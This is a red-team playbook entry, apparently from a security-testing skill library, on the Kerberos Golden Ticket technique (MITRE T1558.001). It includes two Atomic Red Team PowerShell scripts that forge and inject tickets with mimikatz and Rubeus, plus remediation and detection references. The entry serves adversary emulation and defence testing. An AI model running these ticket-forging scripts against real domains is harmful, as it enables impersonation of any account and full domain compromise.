---
name: "T1558.001_golden-ticket"
description: "Adversaries who have the KRBTGT account password hash may forge Kerberos ticket-granting tickets (TGT), also known as a golden ticket."
category: "authentication"
version: "18.1"
author: "cyberstrike-official"
tags:
  - mitre-attack
  - enterprise
  - t1558.001
  - credential-access
  - windows
  - sub-technique
technique_id: "T1558.001"
tactic: "credential-access"
all_tactics:
  - credential-access
platforms:
  - Windows
mitre_url: "https://attack.mitre.org/techniques/T1558/001"
tech_stack:
  - windows
cwe_ids:
  - CWE-522
chains_with:
  - T1558
  - T1558.002
  - T1558.003
  - T1558.004
  - T1558.005
prerequisites:
  - T1558
severity_boost:
  T1558: "Chain with T1558 for deeper attack path"
  T1558.002: "Chain with T1558.002 for deeper attack path"
  T1558.003: "Chain with T1558.003 for deeper attack path"
---

# T1558.001 Golden Ticket

> **Sub-technique of:** T1558

## High-Level Description

Adversaries who have the KRBTGT account password hash may forge Kerberos ticket-granting tickets (TGT), also known as a golden ticket. Golden tickets enable adversaries to generate authentication material for any account in Active Directory.

Using a golden ticket, adversaries are then able to request ticket granting service (TGS) tickets, which enable access to specific resources. Golden tickets require adversaries to interact with the Key Distribution Center (KDC) in order to obtain TGS.

The KDC service runs all on domain controllers that are part of an Active Directory domain. KRBTGT is the Kerberos Key Distribution Center (KDC) service account and is responsible for encrypting and signing all Kerberos tickets. The KRBTGT password hash may be obtained using OS Credential Dumping and privileged access to a domain controller.

## Kill Chain Phase

- Credential Access (TA0006)

**Platforms:** Windows

## What to Check

- [ ] Identify if Golden Ticket technique is applicable to target environment
- [ ] Check Windows systems for indicators of Golden Ticket
- [ ] Verify mitigations are bypassed or absent (2 known mitigations)
- [ ] Assess detection coverage (1 detection strategies)

## How to Test

### Atomic Red Team Tests

The following tests are from [Atomic Red Team](https://github.com/redcanaryco/atomic-red-team) and provide actionable ways to test this technique:

### Atomic Test 1: Crafting Active Directory golden tickets with mimikatz

Once the hash of the special krbtgt user is retrieved it is possible to craft Kerberos Ticket Granting Ticket impersonating any user in the Active Directory domain.
This test crafts a Golden Ticket and then performs an SMB request with it for the SYSVOL share, thus triggering a service ticket request (event ID 4769).
The generated ticket is injected in a new empty Windows session and discarded after, so it does not pollute the current Windows session.

**Supported Platforms:** windows

```powershell
Remove-Item $env:TEMP\golden.bat -ErrorAction Ignore
Remove-Item $env:TEMP\golden.txt -ErrorAction Ignore

# get current domain SID if default was used
$domain_sid = "#{domain_sid}"
If ($domain_sid -Match "DEFAULT") {
  # code from https://www.sevecek.com/EnglishPages/Lists/Posts/Post.aspx?ID=60
  $domain = gwmi Win32_ComputerSystem | Select -Expand Domain
  $krbtgtSID = (New-Object Security.Principal.NTAccount $domain\krbtgt).Translate([Security.Principal.SecurityIdentifier]).Value
  $domain_sid = $krbtgtSID.SubString(0, $krbtgtSID.LastIndexOf('-'))
}

# create batch file with commands to run in a separate "runas /netonly" session
# so we don't purge Kerberos ticket from the current Windows session
# its output goes to golden.txt temp file, because we cannot capture "runas /netonly" output otherwise
@"
>%TEMP%\golden.txt 2>&1 (
  echo Purge existing tickets and create golden ticket:
  klist purge
  #{mimikatz_path} "kerberos::golden /domain:#{domain} /sid:DOMAIN_SID /aes256:#{krbtgt_aes256_key} /user:#{account} /ptt" "exit"

  echo.
  echo Requesting SYSVOL:
  dir \\#{domain}\SYSVOL

  echo.
  echo Tickets after requesting SYSVOL:
  klist

  echo.
  echo End of Golden Ticket attack
)
"@ -Replace "DOMAIN_SID", $domain_sid | Out-File -Encoding OEM $env:TEMP\golden.bat

# run batch file in a new empty session (password and username do not matter)
echo "foo" | runas /netonly /user:fake "$env:TEMP\golden.bat" | Out-Null

# wait until the output file has logged the entire attack
do {
  Start-Sleep 1 # wait a bit so the output file has time to be created
  Get-Content -Path "$env:TEMP\golden.txt" -Wait | ForEach-Object {
    if ($_ -match 'End of Golden Ticket attack') { break }
  }
} while ($false) # dummy loop so that 'break' can be used

# show output from new empty session
Get-Content $env:TEMP\golden.txt

# cleanup temp files
Remove-Item $env:TEMP\golden.bat -ErrorAction Ignore
Remove-Item $env:TEMP\golden.txt -ErrorAction Ignore
```

**Dependencies:**

- Mimikatz executor must exist on disk and at specified location (#{mimikatz_path})

### Atomic Test 2: Crafting Active Directory golden tickets with Rubeus

Once the hash of the special krbtgt user is retrieved it is possible to craft Kerberos Ticket Granting Ticket impersonating any user in the Active Directory domain.
This test crafts a Golden Ticket and then performs an SMB request with it for the SYSVOL share, thus triggering a service ticket request (event ID 4769).
The generated ticket is injected in a new empty Windows session and discarded after, so it does not pollute the current Windows session.

**Supported Platforms:** windows

```powershell
Remove-Item $env:TEMP\golden.bat -ErrorAction Ignore
Remove-Item $env:TEMP\golden.txt -ErrorAction Ignore

cmd.exe /c "#{local_folder}\#{local_executable}" golden /aes256:#{krbtgt_aes256_key} /ldap /user:#{account} /dc:$(#{domaincontroller}) /printcmd /outfile:golden
$filename = (Get-ChildItem | ? {$_.Name.startswith("golden_")} | Sort-Object -Descending -Property LastWriteTime | select -First 1).Name

# create batch file with commands to run in a separate "runas /netonly" session
# so we don't purge Kerberos ticket from the current Windows session
# its output goes to golden.txt temp file, because we cannot capture "runas /netonly" output otherwise
@"
>%TEMP%\golden.txt 2>&1 (
  echo Purge existing tickets and create golden ticket:
  klist purge
  cd %temp%
  "#{local_folder}\#{local_executable}" ptt /ticket:kirbifile

  echo.
  echo Requesting SYSVOL:
  dir \\$(#{domaincontroller})\SYSVOL

  echo.
  echo Tickets after requesting SYSVOL:
  klist

  echo.
  echo End of Golden Ticket attack
)
"@ -Replace "kirbifile", $filename | Out-File -Encoding OEM $env:TEMP\golden.bat

# run batch file in a new empty session (password and username do not matter)
echo "foo" | runas /netonly /user:fake "$env:TEMP\golden.bat" | Out-Null

# wait until the output file has logged the entire attack
do {
  Start-Sleep 1 # wait a bit so the output file has time to be created
  Get-Content -Path "$env:TEMP\golden.txt" -Wait | ForEach-Object {
    if ($_ -match 'End of Golden Ticket attack') { break }
  }
} while ($false) # dummy loop so that 'break' can be used

# show output from new empty session
Get-Content $env:TEMP\golden.txt

# cleanup temp files
Remove-Item $env:TEMP\golden.bat -ErrorAction Ignore
Remove-Item $env:TEMP\golden.txt -ErrorAction Ignore
```

**Dependencies:**

- Computer must be domain joined
- Rubeus must exist

### Manual Testing

If Atomic Red Team tests are not applicable, manually verify the technique by:

1. **Identify Attack Surface**: Determine if the target environment is susceptible to Golden Ticket by examining the target platforms (Windows).

2. **Assess Existing Defenses**: Review whether mitigations for T1558.001 are in place. If defenses are absent or misconfigured, this technique may be exploitable.

3. **Execute Test**: Use tools and methods described in the MITRE ATT&CK page and external references below.

## Remediation Guide

### M1026 Privileged Account Management

Limit domain admin account permissions to domain controllers and limited servers. Delegate other admin functions to separate accounts.

### M1015 Active Directory Configuration

For containing the impact of a previously generated golden ticket, reset the built-in KRBTGT account password twice, which will invalidate any existing golden tickets that have been created with the KRBTGT hash and other Kerberos tickets derived from it. For each domain, change the KRBTGT account password once, force replication, and then change the password a second time. Consider rotating the KRBTGT account password every 180 days.

## Detection

### Detect Forged Kerberos Golden Tickets (T1558.001)

## Risk Assessment

| Finding                            | Severity | Impact            |
| ---------------------------------- | -------- | ----------------- |
| Golden Ticket technique applicable | High     | Credential Access |

## CWE Categories

| CWE ID  | Title                                |
| ------- | ------------------------------------ |
| CWE-522 | Insufficiently Protected Credentials |

## References

- [AdSecurity Kerberos GT Aug 2015](https://adsecurity.org/?p=1640)
- [CERT-EU Golden Ticket Protection](https://cert.europa.eu/static/WhitePapers/UPDATED%20-%20CERT-EU_Security_Whitepaper_2014-007_Kerberos_Golden_Ticket_Protection_v1_4.pdf)
- [ADSecurity Detecting Forged Tickets](https://adsecurity.org/?p=1515)
- [ADSecurity Kerberos and KRBTGT](https://adsecurity.org/?p=483)
- [Stealthbits Detect PtT 2019](https://blog.stealthbits.com/detect-pass-the-ticket-attacks)
- [Microsoft Kerberos Golden Ticket](https://gallery.technet.microsoft.com/scriptcenter/Kerberos-Golden-Ticket-b4814285)
- [Atomic Red Team - T1558.001](https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1558.001)
- [MITRE ATT&CK - T1558.001](https://attack.mitre.org/techniques/T1558/001)
